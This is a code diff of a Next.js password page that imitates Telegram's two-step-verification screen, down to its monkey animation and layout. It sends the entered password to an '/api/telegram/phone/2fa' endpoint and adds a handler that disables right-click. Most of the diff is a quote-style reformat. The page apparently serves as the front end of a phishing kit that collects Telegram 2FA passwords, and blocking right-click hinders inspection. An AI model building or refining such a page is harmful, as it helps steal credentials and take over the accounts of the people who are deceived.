@@ -1,23 +1,29 @@
-'use client';
+"use client";
 
-import { useEffect, useMemo, useState } from 'react';
-import { useRouter } from 'next/navigation';
+import { useEffect, useMemo, useState } from "react";
+import { useRouter } from "next/navigation";
 
 export default function PasswordPage() {
+  useEffect(() => {
+    const handleContextMenu = (e) => e.preventDefault(); // disable right-click
+    document.addEventListener("contextmenu", handleContextMenu);
+    return () => {
+      document.removeEventListener("contextmenu", handleContextMenu);
+    };
+  }, []);
   const router = useRouter();
 
   // 🐵 assets (put them in /public and use absolute paths for reliability)
-  const closedImageSrc = '/monkey-face-hide.gif';     // animated (eyes covered)
-  const openImageSrc   = '/monkey-open.png';          // static (eyes open)
-  const AFTER_GIF      = '/monkey-face-stop.png'; // ⬅️ shown AFTER the GIF plays once
+  const closedImageSrc = "/monkey-face-hide.gif"; // animated (eyes covered)
+  const openImageSrc = "/monkey-open.png"; // static (eyes open)
+  const AFTER_GIF = "/monkey-face-stop.png"; // ⬅️ shown AFTER the GIF plays once
 
-  // Length of one full GIF loop (in ms) — set this to your actual GIF duration
   const gifDurationMs = 1800;
 
   const [showPwd, setShowPwd] = useState(false);
-  const [password, setPassword] = useState('');
+  const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
-  const [err, setErr] = useState('');
+  const [err, setErr] = useState("");
 
   // Play closed GIF only once on initial mount, then show AFTER_GIF
   const [playedOnce, setPlayedOnce] = useState(false);
@@ -32,30 +38,30 @@ export default function PasswordPage() {
   // - showPwd = false => GIF until it has "played once", then AFTER_GIF
   const currentImg = useMemo(() => {
     if (showPwd) return openImageSrc;
-    return playedOnce ? (AFTER_GIF || closedImageSrc) : closedImageSrc;
+    return playedOnce ? AFTER_GIF || closedImageSrc : closedImageSrc;
   }, [showPwd, playedOnce, openImageSrc, closedImageSrc, AFTER_GIF]);
 
   async function onSubmit(e) {
     e.preventDefault();
     if (!password.trim() || loading) return;
     setLoading(true);
-    setErr('');
+    setErr("");
 
     try {
-      const res = await fetch('/api/telegram/phone/2fa', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+      const res = await fetch("/api/telegram/phone/2fa", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ password }),
       });
 
       const data = await res.json().catch(() => ({}));
       if (res.ok && data?.ok) {
-        router.push('/welcome');
+        router.push("/welcome");
       } else {
-        setErr(data?.error || 'Invalid password');
+        setErr(data?.error || "Invalid password");
       }
     } catch (e) {
-      setErr('Network error. Please try again.');
+      setErr("Network error. Please try again.");
     } finally {
       setLoading(false);
     }
@@ -65,7 +71,6 @@ export default function PasswordPage() {
     <main className="min-h-screen bg-white flex items-center justify-center p-6">
       {/* fixed-width container like Telegram */}
       <div className="w-[360px] sm:w-[380px] flex flex-col items-center text-center">
-
         {/* 🐵 Monkey GIF / image */}
         <div
           className="w-[140px] h-[140px] bg-center bg-no-repeat bg-contain"
@@ -88,7 +93,7 @@ export default function PasswordPage() {
         <form className="w-full mt-6" onSubmit={onSubmit}>
           <div className="relative w-full">
             <input
-              type={showPwd ? 'text' : 'password'}
+              type={showPwd ? "text" : "password"}
               placeholder=""
               value={password}
               onChange={(e) => setPassword(e.target.value)}
@@ -109,7 +114,7 @@ export default function PasswordPage() {
             <button
               type="button"
               onClick={() => setShowPwd((prev) => !prev)}
-              aria-label={showPwd ? 'Hide password' : 'Show password'}
+              aria-label={showPwd ? "Hide password" : "Show password"}
               className="
                 absolute right-2 top-1/2 -translate-y-1/2
                 h-8 w-8 grid place-items-center
@@ -152,11 +157,7 @@ export default function PasswordPage() {
           </div>
 
           {/* Error */}
-          {err ? (
-            <div className="mt-3 text-sm text-red-600">
-              {err}
-            </div>
-          ) : null}
+          {err ? <div className="mt-3 text-sm text-red-600">{err}</div> : null}
 
           {/* NEXT button with spinner */}
           <button
@@ -181,7 +182,7 @@ export default function PasswordPage() {
                 Verifying…
               </span>
             ) : (
-              'Next'
+              "Next"
             )}
           </button>
         </form>
